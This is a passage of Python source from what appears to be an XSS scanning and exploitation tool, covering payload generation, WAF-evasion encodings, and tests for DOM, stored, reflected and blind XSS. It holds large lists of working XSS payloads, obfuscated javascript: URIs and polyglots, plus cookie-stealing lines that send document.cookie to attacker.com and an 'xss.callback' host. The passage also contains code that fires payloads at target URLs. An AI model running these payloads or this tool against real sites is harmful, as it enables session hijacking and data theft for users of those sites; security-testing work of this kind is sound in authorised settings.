            # Apply evasions to base payloads
            for payload in dynamic_payloads[:10]:  # Apply to first 10
                for evasion_func in evasion_funcs:
                    try:
                        evaded = evasion_func(payload)
                        if evaded != payload:
                            waf_specific_payloads.append(evaded)
                    except:
                        pass
            
            if self.verbose:
                print(f"{Fore.MAGENTA}[*] Generated {len(waf_specific_payloads)} {self.waf_detected}-specific bypass payloads{Style.RESET_ALL}")
        else:
            # Apply generic evasions by default
            for payload in dynamic_payloads[:10]:
                for evasion_func in waf_evasions['generic']:
                    try:
                        evaded = evasion_func(payload)
                        if evaded != payload:
                            waf_specific_payloads.append(evaded)
                    except:
                        pass
        
        # 4. Add domain-specific payloads (using actual domain)
        domain_payloads = [
            f'<img src=x onerror=alert("{domain}")>',
            f'<svg onload=alert("{domain}")>',
            f'<script>alert("{domain}")</script>',
        ]
        
        # 5. Add encoding variants
        encoding_payloads = []
        base_alert = '<img src=x onerror=alert(1)>'
        encoding_payloads.extend([
            # URL encoding
            '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
            # Double URL encoding
            '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
            # Unicode encoding
            '\u003cimg src=x onerror=alert(1)\u003e',
            # HTML entity encoding
            '&lt;img src=x onerror=alert(1)&gt;',
            # Mixed case
            '<ImG sRc=x OnErRoR=alert(1)>',
            # No quotes
            '<img src=x onerror=alert(1)>',
            # Template literals
            '<img src=x onerror=alert`1`>',
        ])
        
        # 6. Combine all payloads (prioritize WAF-specific)
        final_payloads = []
        final_payloads.extend(waf_specific_payloads)  # WAF bypasses first
        final_payloads.extend(encoding_payloads)       # Encoding variants
        final_payloads.extend(domain_payloads)         # Domain-specific
        final_payloads.extend(dynamic_payloads[:20])   # Base payloads (limited)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in final_payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        if self.verbose:
            print(f"{Fore.CYAN}[*] Generated {len(unique_payloads)} dynamic payloads for target{Style.RESET_ALL}")
        
        return unique_payloads
    
    def _test_dom_xss(self, url, soup):
        """Test for DOM-based XSS vulnerabilities - ADVANCED with WAF Bypass"""
        dom_vulns = []
        
        # Advanced DOM XSS Payloads - Context-aware with WAF bypass variants
        DOM_XSS_PAYLOADS = {
            'generic': [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '"><img src=x onerror=alert(1)>',
                "'-alert(1)-'",
            ],
            'waf_bypass': [
                '<img src=x onerror=alert`1`>',
                '<svg/onload=alert(1)>',
                '<img src=x onerror=prompt(1)>',
                '"><svg/onload=alert(1)//',
                '<img src=x onerror=confirm(1)>',
                '<math><maction xlink:href=javascript:alert(1)>click</maction></math>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src onerror=alert(1)>',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<form><button formaction=javascript:alert(1)>X</button></form>',
                '<input onfocus=alert(1) autofocus>',
                '<select autofocus onfocus=alert(1)>',
                '<textarea autofocus onfocus=alert(1)>',
                '<keygen autofocus onfocus=alert(1)>',
                '<isindex action=javascript:alert(1) type=image>',
                '<xss onpointerrawupdate=alert(1)>XSS</xss>',
            ],
            'execution': [
                "';alert(1)//",
                '";alert(1)//',
                "javascript:alert(1)",
                "\\'-alert(1)//",
                '</script><script>alert(1)</script>',
            ],
            'polyglot': [
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                '\'-alert(1)-\'',
                '"><img src=x id=confirm(1)>',
            ],
            'console': [
                'console.log(1)',
                'console.log`1`',
                'console.log(alert(1))',
                'console.log`${alert(1)}`',
                'console.log`${prompt(document.domain)}`',
                'console.log(Function("alert(1)")())',
                "console.log(atob('YWxlcnQoMSk='))",
                "console.log(String.fromCharCode(97,108,101,114,116,40,49,41))",
                "console.log('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')",
                "console.log(eval('\\u0061lert(1)'))",
                "console.log(window)",
                "console.log(globalThis)",
                "console.log(this)",
                "console.log`${alert`1`}`",
                "console.log(onerror=alert,throw 1)",
                "console.log(location=`javascript:alert(1)`)",
                "console.log(top)",
                "console.log(self)",
                "console.log(prompt(1))",
                "console.log(confirm(1))",
                "console.log(console.error(1))",
                "console.log(fetch('https://attacker.com/?c='+document.cookie))",
                "console.log(new Error().stack)",
                "console.log(console.trace())",
                "console.log('</script><img src=x onerror=alert(1)>')",
                "console.log(Reflect.construct(Function,['alert(1)'])())",
                "console.log(Reflect.apply(eval,null,['alert(1)']))",
                "console.log([].constructor.constructor('alert(1)')())",
                "console.log((1,alert)(1))",
                "console.log(document.body.onclick=alert)",
            ],
            'obfuscated': [
                '<a href="javascript:alert()">XSS</a>',
                '<a href="javas&Tab;cript:alert()">XSS</a>',
                '<a href="javas&#9;cript:alert()">XSS</a>',
                '<a href="javas&#x09;cript:alert()">XSS</a>',
                '<a href="j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:alert()">XSS</a>',
                '<a href="j&#x09;a&#x09;v&#x09;a&#x09;s&#x09;c&#x09;r&#x09;i&#x09;p&#x09;t:alert()">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert()">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(\'<h1\\>Hello, World!</h1\\>\')">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(\'<marquee\\>Hello, World!</marquee\\>\')">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.cookie)">XSS</a>',
                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.domain)">XSS</a>',
                
                # Decimal/Hex Encoded
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#49;&#51;&#51;&#55;&#41;">XSS</a>',
                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;">XSS</a>',
                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">XSS</a>',
                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;">XSS</a>',
                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;&#x28;&#x31;&#x29;">XSS</a>',
                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">XSS</a>',

                # Mixed Encoding & Whitespace
                '<a href="java&#9;script:alert()">XSS</a>',
                '<a href="java&#x09;script:alert()">XSS</a>',
                '<a href="j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t&#9;:alert()">XSS</a>',
                '<a href="java&#10;script:alert()">XSS</a>',
                '<a href="java&#x0a;script:alert()">XSS</a>',
                '<a href="java&#13;script:alert()">XSS</a>',

                # Encoded Sinks
                '<a href="javascript:document.write(\'<h1>XSS</h1>\')">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#39;&#60;&#104;&#49;&#62;&#88;&#83;&#83;&#60;&#47;&#104;&#49;&#62;&#39;&#41;">XSS</a>',
                '<a href="javascript:document.write(document.cookie)">XSS</a>',
                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;">XSS</a>',

                # Advanced Protocols & Obfuscation
                '<a href="data:text/html,<script>alert(1)</script>">XSS</a>',
                '<a href="&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">XSS</a>',
                '<a href="vbscript:MsgBox(1)">XSS</a>',
                '<a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#77;&#115;&#103;&#66;&#111;&#120;&#40;&#49;&#41;">XSS</a>',
                '<a href="java&#0;script:alert(1)">XSS</a>',
                '<a href="javascript&#0;:alert(1)">XSS</a>',
                '<a href="&#65306;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">XSS</a>', # Fullwidth Colon
                '<a href="javascript:alert`1`">XSS</a>',
                '<a href="javascript:onerror=alert;throw 1">XSS</a>',
                '<a href="javascript:alert(String.fromCharCode(49))">XSS</a>',

            ]
        }
        
        # Extended Source-to-Sink patterns
        # Format: (Source, Sink, InjectionType)
        # InjectionType: 'hash', 'query', 'path', 'referrer', etc.
        patterns = [
            # Classic
            ('location.hash', 'innerHTML', 'hash'),
            ('location.hash', 'document.write', 'hash'),
            ('location.hash', 'eval', 'hash'),
            ('location.search', 'innerHTML', 'query'),
            ('location.search', 'document.write', 'query'),
            ('location.href', 'document.write', 'query'),
            ('window.name', 'innerHTML', 'window_name'),
            ('document.referrer', 'innerHTML', 'referrer'),
            
            # Execution sinks
            ('location.hash', 'setTimeout', 'hash'),
            ('location.hash', 'setInterval', 'hash'),
            ('location.hash', 'Function', 'hash'),
            ('location.search', 'eval', 'query'),
            
            # Framework specific
            ('location.hash', 'dangerouslySetInnerHTML', 'hash'), # React
            ('location.hash', 'v-html', 'hash'), # Vue
            ('location.hash', 'ng-bind-html', 'hash'), # Angular
            
            # jQuery
            ('location.hash', '$', 'hash'),
            ('location.hash', 'jQuery', 'hash'),
            ('location.hash', '.html(', 'hash'),
            ('location.search', '.html(', 'query'),
        ]
        
        # Check if page has vulnerable sinks
        scripts = soup.find_all('script')
        
        for script in scripts:
            if script.string:
                js_code = script.string
                js_lower = js_code.lower()
                
                for source, sink, inj_type in patterns:
                    # HEURISTIC 1: Basic component presence (fast fail)
                    if source.lower() not in js_lower or sink.lower() not in js_lower:
                        continue
                        
                    # HEURISTIC 2: Data Flow Verification (Regex)
                    # We want to check if Source actually flows into Sink
                    
                    found_vuln = False
                    
                    # Case A: Function Call Sink (e.g., document.write(location.href))
                    if sink in ['document.write', 'eval', 'setTimeout', 'setInterval', 'Function', '$', 'jQuery', '.html(']:
                        pattern = re.compile(rf"{re.escape(sink)}\s*\([^\)]*{re.escape(source)}", re.IGNORECASE)
                        if pattern.search(js_code):
                            found_vuln = True
                            
                    # Case B: Assignment Sink (e.g., element.innerHTML = location.hash)
                    else:
                        pattern = re.compile(rf"{re.escape(sink)}\s*=\s*[^;]*{re.escape(source)}", re.IGNORECASE)
                        if pattern.search(js_code):
                            found_vuln = True
                            
                    if found_vuln:
                        # DYNAMIC PAYLOAD GENERATION - Always enabled by default
                        # Generate payloads based on target characteristics
                        dynamic_payloads = self._generate_dynamic_payloads(url, sink_type=sink)
                        
                        # Also include static payloads for comprehensive testing
                        if sink in ['eval', 'setTimeout', 'setInterval', 'Function']:
                            static_payloads = DOM_XSS_PAYLOADS['execution'] + DOM_XSS_PAYLOADS['console']
                        else:
                            static_payloads = DOM_XSS_PAYLOADS['generic']
                        
                        # Combine: Dynamic first (target-specific), then static
                        payloads_to_test = dynamic_payloads + static_payloads
                        
                        # Add WAF bypass payloads if WAF bypass mode is active
                        if self.waf_bypass:
                            payloads_to_test = DOM_XSS_PAYLOADS['waf_bypass'] + payloads_to_test
                            payloads_to_test = payloads_to_test + DOM_XSS_PAYLOADS['polyglot']
                            payloads_to_test = payloads_to_test + DOM_XSS_PAYLOADS['obfuscated']
                        
                        # Remove duplicates while preserving order
                        seen = set()
                        unique_payloads = []
                        for p in payloads_to_test:
                            if p not in seen:
                                seen.add(p)
                                unique_payloads.append(p)
                        payloads_to_test = unique_payloads
                        
                        # Test each payload and generate exploitation URLs
                        for payload in payloads_to_test:
                            exploitation_url = url
                            is_waf_bypass_payload = payload in DOM_XSS_PAYLOADS['waf_bypass']
                            
                            if inj_type == 'hash':
                                exploitation_url = f"{url}#{payload}"
                            elif inj_type == 'query':
                                from urllib.parse import quote
                                encoded_payload = quote(payload, safe='')
                                if '?' in url:
                                    exploitation_url = f"{url}&xss={encoded_payload}"
                                else:
                                    exploitation_url = f"{url}?xss={encoded_payload}"
                            elif inj_type == 'window_name':
                                exploitation_url = f"{url} [window.name={payload}]"
                            elif inj_type == 'referrer':
                                exploitation_url = f"{url} [Referrer:{payload}]"
                            
                            vuln_entry = {
                                'url': url,
                                'param': source,
                                'method': 'DOM',
                                'payload': payload,
                                'full_url': exploitation_url,
                                'source': source,
                                'sink': sink,
                                'context': f"{source} -> {sink}",
                                'type': 'DOM',
                                'severity': 'HIGH',
                                'evidence': f"Source: {source} → Sink: {sink}",
                                'exploitation_url': exploitation_url,
                                'is_waf_bypass': is_waf_bypass_payload,
                            }
                            
                            dom_vulns.append(vuln_entry)
                            
                            # Print WAF bypass success message if applicable
                            if is_waf_bypass_payload and self.waf_bypass:
                                if self.verbose:
                                    print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
                                    print(f"{Fore.MAGENTA}|{' '*20}⚔️  WAF BYPASS SUCCESSFUL!{' '*20}|{Style.RESET_ALL}")
                                    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
                                    print(f"{Fore.WHITE}| Sink:    {Fore.CYAN}{sink}{Style.RESET_ALL}")
                                    print(f"{Fore.WHITE}| Source:  {Fore.CYAN}{source}{Style.RESET_ALL}")
                                    print(f"{Fore.WHITE}| Payload: {Fore.GREEN}{payload}{Style.RESET_ALL}")
                                    print(f"{Fore.WHITE}| PoC URL: {Fore.BLUE}{exploitation_url}{Style.RESET_ALL}")
                                    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")
                            
                            # Only report first successful payload per sink to avoid spam
                            break
                        
        return dom_vulns
    
    def _test_stored_xss(self, url, param, method, payload):
        """Test for Stored XSS by checking if payload persists - ADVANCED"""
        from urllib.parse import quote
        
        # Create unique identifier for this test
        unique_id = f"STORED_XSS_{hash(url + param) % 100000}"
        test_payload = f'<script>/*{unique_id}*/alert(1)</script>'
        
        try:
            # First, submit the payload
            if method == 'GET':
                submit_url = f"{url}?{param}={quote(test_payload, safe='')}"
                self.session.get(submit_url, timeout=self.timeout, verify=False)
            else:
                self.session.post(url, data={param: test_payload}, timeout=self.timeout, verify=False)
            
            time.sleep(0.5)  # Wait for potential storage
            
            # Now check if it's persisted by visiting related pages
            check_urls = [
                url,
                url.rstrip('/') + '/view',
                url.rstrip('/') + '/show',
                url.rstrip('/') + '/list',
            ]
            
            for check_url in check_urls:
                try:
                    response = self.session.get(check_url, timeout=self.timeout, verify=False)
                    if unique_id in response.text and '<script>' in response.text:
                        return {
                            'vulnerable': True,
                            'type': 'stored',
                            'unique_id': unique_id,
                            'found_at': check_url,
                            'severity': 'critical'
                        }
                except:
                    continue
                    
        except:
            pass
        
        return {'vulnerable': False}
    
    def _test_blind_xss(self, url, param, method):
        """Generate Blind XSS payloads with callback detection - ADVANCED"""
        # Blind XSS payloads that would call back to attacker-controlled server
        # These are demonstration payloads - in real use, replace with your own callback URL
        blind_payloads = [
            '"><script src=//xss.callback/s></script>',
            '"><img src=x onerror=this.src="//xss.callback/?c="+document.cookie>',
            '\'/><script src=//xss.callback/s></script>',
            '"><iframe src="javascript:fetch(\'//xss.callback/?c=\'+document.cookie)">',
            '<script>new Image().src="//xss.callback/?c="+document.cookie</script>',
        ]
        
        return {
            'payloads_generated': blind_payloads,
            'note': 'Replace xss.callback with your Blind XSS server (e.g., XSSHunter, BurpCollaborator)',
            'param': param,
            'url': url
        }
    
    def test_all_xss_types(self, url, param, method):
        """Comprehensive XSS testing for all types - MAIN TEST FUNCTION"""
        results = {
            'reflected': [],
            'stored': [],
            'dom': [],
            'blind': []
        }
        
        # Test Reflected XSS (standard test)
        payloads = self.get_payloads()
        for payload in payloads[:50]:  # Limit for speed
            try:
                from urllib.parse import quote
                if method == 'GET':
                    test_url = f"{url}?{param}={quote(payload, safe='')}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(url, data={param: payload}, timeout=self.timeout, verify=False)
                
                if self._check_reflection(response.text, payload):
                    classification = self._classify_xss_type(url, param, method, payload, response)
                    results['reflected'].append({
                        'payload': payload,
                        'context': classification['context'],
                        'severity': classification['severity']
                    })
                    if self.first_only:
                        break
            except:
                continue
        
        # Test Stored XSS (if forms found)
        if method == 'POST':
            stored_result = self._test_stored_xss(url, param, method, '<script>alert("stored")</script>')
            if stored_result.get('vulnerable'):
                results['stored'].append(stored_result)
        
        # Generate Blind XSS payloads
        blind_info = self._test_blind_xss(url, param, method)
        results['blind'] = blind_info
        
        return results
    
    def _detect_context(self, response_text, test_value):
        """Detect where the test value lands in the response - ADVANCED"""
        contexts = []
        
        if test_value not in response_text:
            return contexts
        
        idx = 0
        while True:
            idx = response_text.find(test_value, idx)
            if idx == -1:
                break
            
            # Get surrounding context (100 chars before and after)
            start = max(0, idx - 100)
            end = min(len(response_text), idx + len(test_value) + 100)
            context = response_text[start:end]
            rel_pos = idx - start
            
            # Determine context type
            before = context[:rel_pos].lower()
            after = context[rel_pos + len(test_value):].lower()
            
            # Check for HTML tag context - simplified for speed but reasonably robust
            last_tag_open = before.rfind('<')
            last_tag_close = before.rfind('>')
            
            if last_tag_open != -1 and (last_tag_close == -1 or last_tag_open > last_tag_close):
                # Inside an opening tag (likely attribute)
                
                # Determine the ACTIVE attribute (closest to the payload)
                last_equals = before.rfind('=')
                
                context_type = 'html_attribute' # Default
                
                if last_equals != -1:
                    # Find the attribute name before this '='
                    attr_chunk = before[:last_equals].rstrip()
                    
                    # Iterate backwards to find start of attribute name
                    attr_name_end = len(attr_chunk)
                    attr_name_start = attr_name_end
                    
                    for i in range(attr_name_end - 1, -1, -1):
                        char = attr_chunk[i]
                        if char == ' ' or char == '\t' or char == '\n' or char == '"' or char == "'" or char == '<':
                            break
                        attr_name_start = i
                    
                    current_attr = attr_chunk[attr_name_start:attr_name_end].lower()
                    
                    if current_attr in ['href', 'src', 'action', 'formaction', 'data', 'content']:
                        context_type = 'url_attribute'
                    elif current_attr.startswith('on'):
                        context_type = 'event_handler'
                    elif current_attr in ['value', 'placeholder', 'title', 'alt']:
                        context_type = 'html_attribute' # Explicitly safe-ish
                
                contexts.append({'type': context_type, 'position': idx})
            
            # Check for Script Block context (Robust)
            else:
                last_script_open = before.lower().rfind('<script')
                last_script_close = before.lower().rfind('</script')
                
                if last_script_open != -1 and (last_script_close == -1 or last_script_open > last_script_close):
                    # Inside JavaScript
                    
                    # Check if inside a JS string
                    # Look for unclosed quotes after the last script tag
                    script_content = before[last_script_open:]
                    
                    # Simple heuristic for JS string: Count quotes not preceded by backslash
                    # This is complex to do perfectly with regex in reverse, so we use a simplified check
                    # checking the character immediately preceding or close to text
                    
                    is_js_string = False
                    trimmed_before = before.rstrip()
                    if trimmed_before:
                        last_char = trimmed_before[-1]
                        if last_char in ['"', "'", '`']:
                            is_js_string = True
                        elif last_char == '=': 
                            # var x = payload; <- Not a string typically, often raw injection
                            pass
                    
                    if is_js_string:
                        contexts.append({'type': 'javascript_string', 'position': idx})
                    else:
                        contexts.append({'type': 'javascript', 'position': idx})
                        
                elif '<style' in before.lower() and '</style>' not in before.lower()[before.lower().rfind('<style'):]:
                    # Inside CSS (Approximation)
                    contexts.append({'type': 'css', 'position': idx})
                elif '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
                    # Inside HTML comment
                    contexts.append({'type': 'html_comment', 'position': idx})
                else:
                    # Regular HTML content
                    contexts.append({'type': 'html_body', 'position': idx})
            
            idx += 1
        
        return contexts
    
    def _test_with_encoding_variants(self, url, param, method, base_payload):
        """Test parameter with multiple encoding variants - ADVANCED"""
        from urllib.parse import quote
        
        encoding_variants = [
            # Double encoding
            ('double_url', quote(quote(base_payload, safe=''), safe='')),
            # Mixed case
            ('mixed_case', base_payload.replace('script', 'ScRiPt').replace('alert', 'AlErT')),
            # HTML entities
            ('html_entities', base_payload.replace('<', '&lt;').replace('>', '&gt;')),
            # Unicode
            ('unicode', base_payload.replace('<', '\\u003c').replace('>', '\\u003e')),
            # Null byte injection
            ('null_byte', base_payload.replace('<', '<%00')),
            # Newline injection
            ('newline', base_payload.replace('<', '<\n')),
        ]
        
        for encoding_name, encoded_payload in encoding_variants:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={quote(encoded_payload, safe='')}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(url, data={param: encoded_payload}, timeout=self.timeout, verify=False)
                
                # Check for successful bypass
                if self._check_reflection(response.text, base_payload):
                    return {
                        'encoding': encoding_name,
                        'payload': encoded_payload,
                        'success': True
                    }
            except:
                continue
        
        return {'success': False}
    
    def _test_http_parameter_pollution(self, url, param, method):
        """Test HTTP Parameter Pollution - ADVANCED"""
        hpp_payloads = [
            # Duplicate parameter
            f"{param}=safe&{param}=<script>alert(1)</script>",
            f"{param}=<script>alert(1)</script>&{param}=safe",
            # Array notation
            f"{param}[]=safe&{param}[]=<script>alert(1)</script>",
            # Different encodings
            f"{param}=%3Cscript%3Ealert(1)%3C/script%3E&{param}=safe",
        ]
        
        for hpp_payload in hpp_payloads:
            try:
                if method == 'GET':
                    test_url = f"{url}?{hpp_payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    # Parse the HPP payload into dict for POST
                    continue  # HPP mainly affects GET
                
                if '<script>alert(1)</script>' in response.text:
                    return {
                        'vulnerable': True,
                        'payload': hpp_payload
                    }
            except:
                continue
        
        return {'vulnerable': False}
    
    def _detect_dom_sinks(self, response_text):
        """Detect potential DOM XSS sinks in JavaScript - ADVANCED"""
        dom_sinks = []
        
        dangerous_sinks = [
            ('document.write', 'high'),
            ('document.writeln', 'high'),
            ('innerHTML', 'high'),
            ('outerHTML', 'high'),
            ('insertAdjacentHTML', 'high'),
            ('eval(', 'critical'),
            ('setTimeout(', 'medium'),
            ('setInterval(', 'medium'),
            ('Function(', 'critical'),
            ('location.href', 'medium'),
            ('location.assign', 'medium'),
            ('location.replace', 'medium'),
            ('window.open', 'medium'),
            ('document.domain', 'low'),
            ('.src=', 'medium'),
            ('.href=', 'medium'),
            ('$.html(', 'high'),
            ('$.append(', 'medium'),
            ('jQuery.html(', 'high'),
            ('v-html', 'high'),  # Vue
            ('dangerouslySetInnerHTML', 'critical'),  # React
        ]
        
        # Extract all script content
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
        all_js = ' '.join(script_matches)
        
        for sink, severity in dangerous_sinks:
            if sink.lower() in all_js.lower():
                # Check if it uses user input
                sources = ['location.', 'document.URL', 'document.referrer', 'window.name', 
                          'document.cookie', 'localStorage', 'sessionStorage', 'URLSearchParams']
                for source in sources:
                    if source.lower() in all_js.lower():
                        dom_sinks.append({
                            'sink': sink,
                            'severity': severity,
                            'source': source,
                            'potential_dom_xss': True
                        })
                        break
        
        return dom_sinks
    
    # Patterns that indicate a potential XSS if reflected
    DANGEROUS_PATTERNS = [
        '<script', 'javascript:', 'onerror=', 'onload=', 'onclick=', 
        'onmouseover=', 'onfocus=', 'ontoggle=', 'data:', 'alert', 
        'confirm', 'prompt', 'eval(', 'document.cookie'
    ]

    def _check_reflection(self, response_text, payload):
        """Check if payload is reflected in response WITHOUT being encoded/escaped"""
        import html
        from urllib.parse import unquote
        
        # The payload must appear EXACTLY as sent (unencoded) for XSS to work
        # If it's HTML encoded, it won't execute
        
        # For WAF bypass payloads, we need to check multiple variations:
        # 1. The exact payload
        # 2. URL-decoded version (server may decode)
        # 3. Double URL-decoded version (for double encoding bypasses)
        # 4. Core XSS patterns that indicate successful injection
        
        payloads_to_check = [payload]
        
        # Add URL-decoded versions for encoded bypass payloads
        try:
            decoded_once = unquote(payload)
            if decoded_once != payload:
                payloads_to_check.append(decoded_once)
            decoded_twice = unquote(decoded_once)
            if decoded_twice != decoded_once:
                payloads_to_check.append(decoded_twice)
        except:
            pass
        
        # Check for any version of the payload in the response
        payload_found = False
        # Iterate through ALL variants to find one that is both reflected AND dangerous
        for variant in payloads_to_check:
            matched_payload = variant
            
            # Skip empty payloads to prevent issues
            if not matched_payload:
                continue
            
            # Check if this variant is in the response
            if matched_payload not in response_text:
                continue
                
            # Found a reflection! Now verify it's dangerous
            
            # Use sophisticated context detection instead of simple pattern matching
            # This handles cases where encoded payloads are reflected as plain text (safe)
            # vs. decoded payloads reflected in dangerous contexts (vulnerable)
            
            # Find all occurrences of this specific variant (limit to first 10 to prevent hangs)
            search_start = 0
            max_occurrences = 10  # Safety limit
            occurrence_count = 0
            
            while occurrence_count < max_occurrences:
                idx = response_text.find(matched_payload, search_start)
                if idx == -1:
                    break
                
                occurrence_count += 1
                
                # Verify if this specific reflection is dangerous
                is_dangerous = False
                
                # Check 1: Malformed Tag Verification (Fix for <scr%00ipt> false positives)
                # If the payload uses null bytes or other obfuscation in tag names,
                # it's usually only dangerous if the browser normalizes it (which is rare in modern browsers)
                # We'll consider it safe unless we have strong evidence otherwise
                if matched_payload != payload and '<' in matched_payload:
                    # This is a decoded variant (e.g. <scr\x00ipt>)
                    # Check if the tag name is broken
                    tag_match = re.search(r'<([a-zA-Z0-9]+)', matched_payload)
                    
                    if not tag_match:
                        # Broken tag like <scr%00ipt>
                        # In modern browsers, this is generally SAFE 
                        # We will strictly REQUIRE a dangerous context (like inside an existing script)
                        # Identify context first to decide
                        contexts = self._detect_context(response_text, matched_payload)
                        is_executable_context = False
                        
                        for ctx in contexts:
                            if abs(ctx['position'] - idx) < 20: 
                                if ctx['type'] in ['javascript', 'javascript_string', 'event_handler']:
                                    is_executable_context = True
                                    break
                        
                        if not is_executable_context:
                            # Rejected: Broken tag in HTML body is not dangerous
                            continue
                            
                    else:
                        # Valid tag structure
                        pass

                # Check 2: Context-Aware Verification
                # Use robust context detection for this specific occurrence
                snippet = response_text[max(0, idx-50):min(len(response_text), idx+len(matched_payload)+50)]
                
                # ... existing logic ...
                
                # 1. First, check if the payload itself contains dangerous injection characters
                # If the payload is just alphanumeric "alert(1)", it's only dangerous in specific contexts (like JS)
                # If the payload contains HTML tags "<script...", it's dangerous in HTML body
                
                payload_lower = matched_payload.lower()
                has_tags = '<' in matched_payload and '>' in matched_payload
                has_quotes = '"' in matched_payload or "'" in matched_payload
                
                # Get context type for this specific location
                contexts = self._detect_context(response_text, matched_payload)
                # Filter to the one that matches our current index (approximate check as detect_context finds all)
                current_context_type = 'html_body' # Default
                
                for ctx in contexts:
                    # Check if this context corresponds to our current match position
                    # Allow small offset difference due to how detect_context might calculate pos
                    if abs(ctx['position'] - idx) < 20: # Increasing tolerance slightly
                        current_context_type = ctx['type']
                        break
                
                if current_context_type == 'javascript':
                    # In JS context, "alert(1)" is dangerous even without tags
                    if 'alert' in payload_lower or 'prompt' in payload_lower or 'confirm' in payload_lower:
                        is_dangerous = True
                        
                elif current_context_type == 'event_handler':
                    # In event handler (on*="..."), any code execution is dangerous
                    if 'alert' in payload_lower or 'prompt' in payload_lower:
                        is_dangerous = True
                        
                elif current_context_type == 'url_attribute':
